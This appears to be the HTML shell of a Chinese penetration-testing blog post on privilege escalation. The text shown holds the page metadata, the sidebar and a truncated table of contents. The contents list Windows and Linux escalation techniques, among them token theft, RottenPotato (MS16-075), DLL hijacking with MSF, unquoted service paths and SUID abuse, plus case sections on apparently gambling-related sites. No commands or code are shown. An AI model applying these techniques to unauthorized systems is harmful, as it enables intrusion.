<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>权限提升 | J3fffff&#39;s Blog</title><meta name="description" content="前言 一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system&#x2F;root权限。这里主要是思路的体现。  相关注意点  前期-中期-后期对应知识关系 知识点顺序，理解思路，分类介绍等 注重理解当前权限对应可操作的事情 相关的操作被拒绝无法实现的时候就会涉及到权限提升   权限分类 后台权限  获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合"><meta property="og:type" content="article"><meta property="og:title" content="权限提升"><meta property="og:url" content="https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html"><meta property="og:site_name" content="J3fffff&#39;s Blog"><meta property="og:description" content="前言 一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system&#x2F;root权限。这里主要是思路的体现。  相关注意点  前期-中期-后期对应知识关系 知识点顺序，理解思路，分类介绍等 注重理解当前权限对应可操作的事情 相关的操作被拒绝无法实现的时候就会涉及到权限提升   权限分类 后台权限  获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621163747422.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101836817.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101908888.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621171531434.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094704731.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094741213.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625095218724.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100010606.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100053640.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100611727.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100313042.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100425455.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101243436.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101309992.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101404246.png"><meta property="og:image" content="https://j3f5.github.io/articles/2023/06/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230626093000186.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png"><meta property="og:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628125028105.png"><meta property="og:image" content="https://j3f5.github.io/articles/2023/06/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/68747470733a2f2f67697465652e636f6d2f736d616c6c2d6c656563682d736872696d702f7479706f72615f7069632f7261772f6d61737465722f36342e706e67.png"><meta property="article:published_time" content="2023-06-14T02:42:23.000Z"><meta property="article:modified_time" content="2023-06-27T02:42:23.000Z"><meta property="article:author" content="Jeff"><meta property="article:tag" content="提权"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://j3f5.github.io/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621163747422.png"><link rel="canonical" href="https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html"><link rel="alternate" href="/atom.xml" title="J3fffff&#39;s Blog" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css">   <link rel="stylesheet" href="/css/theme/monokai-hook.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.3.0"></head><body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/j3f5" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">妄想星空</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Pentestor</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">标签</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎交流与分享经验!</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">JAVA安全基础</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">开发基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/">打靶</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/">车联网基础</a><span class="category-list-count">4</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CAN/" rel="tag">CAN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JWT/" rel="tag">JWT</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf%E7%BB%95%E8%BF%87/" rel="tag">waf绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" rel="tag">业务逻辑</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%AB%E6%8C%81/" rel="tag">劫持</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag">博客搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" rel="tag">审计技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" rel="tag">整体流程</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" rel="tag">渗透技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" rel="tag">漏洞发现</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A0%B4%E8%A7%A3/" rel="tag">破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%8A%E6%96%AD/" rel="tag">诊断</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F/" rel="tag">跨域</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" rel="tag">车联网标准</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/CAN/" style="font-size:13px">CAN</a> <a href="/tags/CSRF/" style="font-size:13.33px">CSRF</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/RCE/" style="font-size:13.33px">RCE</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/XSS/" style="font-size:13.67px">XSS</a> <a href="/tags/XXE/" style="font-size:13.33px">XXE</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size:14px">sql注入</a> <a href="/tags/waf%E7%BB%95%E8%BF%87/" style="font-size:13px">waf绕过</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" style="font-size:13px">业务逻辑</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8A%AB%E6%8C%81/" style="font-size:13px">劫持</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size:13px">协议</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size:13px">博客搭建</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" style="font-size:13px">审计技巧</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" style="font-size:13.33px">整体流程</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13.33px">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:13px">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size:13px">文件读取</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size:13px">权限提升</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" style="font-size:13px">渗透技巧</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size:13px">漏洞发现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size:13px">漏洞扫描</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size:13px">破解</a> <a href="/tags/%E8%AF%8A%E6%96%AD/" style="font-size:13px">诊断</a> <a href="/tags/%E8%B7%A8%E5%9F%9F/" style="font-size:13px">跨域</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" style="font-size:13px">车联网标准</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">13</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/">打靶</a></p><p class="item-title"><a href="/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/" class="title">打靶-Raven2</a></p><p class="item-date"><time datetime="2023-06-28T02:07:36.000Z" itemprop="datePublished">2023-06-28</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></p><p class="item-title"><a href="/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/" class="title">nacos复现</a></p><p class="item-date"><time datetime="2023-06-26T12:22:04.000Z" itemprop="datePublished">2023-06-26</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a></p><p class="item-title"><a href="/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="title">内网安全</a></p><p class="item-date"><time datetime="2023-06-26T02:32:30.000Z" itemprop="datePublished">2023-06-26</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/">车联网基础</a></p><p class="item-title"><a href="/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/" class="title">车联网基础-SocketCAN与车辆通信</a></p><p class="item-date"><time datetime="2023-06-20T01:38:06.000Z" itemprop="datePublished">2023-06-20</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/">车联网基础</a></p><p class="item-title"><a href="/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/" class="title">车联网基础-诊断和日志</a></p><p class="item-date"><time datetime="2023-06-15T05:03:59.000Z" itemprop="datePublished">2023-06-15</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">相关注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">权限分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell"><span class="toc-number">2.</span> <span class="toc-text">Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">获得权限的思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%90%E6%8C%82%E5%A3%81%E7%A8%8B%E5%BA%8F%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E5%90%8E%E5%8F%B0%E5%8A%9F%E8%83%BD"><span class="toc-number">2.2.</span> <span class="toc-text">某挂壁程序后台权限提升-后台功能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%90-bc-%E5%B9%BF%E5%91%8A%E5%AF%BC%E8%88%AA%E9%A1%B5%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%BC%8F%E6%B4%9E%E5%B1%82%E9%9D%A2"><span class="toc-number">2.3.</span> <span class="toc-text">某 BC 广告导航页权限提升-漏洞层面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glassfish-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9"><span class="toc-number">2.4.</span> <span class="toc-text">GlassFish 中间件-第三方</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text">服务器权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#win%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">WIN提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">权限划分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">基础命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-shell%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.2.</span> <span class="toc-text">WEB-shell提权思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9Eatscps"><span class="toc-number">3.1.3.</span> <span class="toc-text">本地提权思路——溢出漏洞&#x2F;AT&#x2F;SC&#x2F;PS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">AT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sc"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">SC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ps"><span class="toc-number">3.1.3.3.</span> <span class="toc-text">PS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%8F%8A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E8%80%81"><span class="toc-number">3.1.4.</span> <span class="toc-text">令牌窃取及权限提升「老」</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5dll%E5%8A%AB%E6%8C%81%E8%80%81"><span class="toc-number">3.1.5.</span> <span class="toc-text">进程注入（DLL劫持）「老」</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86ms16-075%E9%85%8D%E5%90%88%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.6.</span> <span class="toc-text">烂土豆MS16-075配合令牌窃取提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rottenpotato%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.6.1.</span> <span class="toc-text">RottenPotato原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.6.2.</span> <span class="toc-text">烂土豆提权流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="toc-number">3.1.6.3.</span> <span class="toc-text">注意的点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E5%BA%94%E7%94%A8%E9%85%8D%E5%90%88msfweb%E6%9D%83%E9%99%90"><span class="toc-number">3.1.7.</span> <span class="toc-text">DLL劫持提权应用配合MSF——web权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.7.1.</span> <span class="toc-text">DLL劫持提权流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">3.1.7.2.</span> <span class="toc-text">注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88msf"><span class="toc-number">3.1.8.</span> <span class="toc-text">不带引号服务路径配合MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.8.1.</span> <span class="toc-text">流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88msf%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90"><span class="toc-number">3.1.9.</span> <span class="toc-text">不安全服务权限配合MSF——本地权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-2"><span class="toc-number">3.1.9.1.</span> <span class="toc-text">流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">3.2.1.</span> <span class="toc-text">用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.2.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.3.</span> <span class="toc-text">SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-3"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a 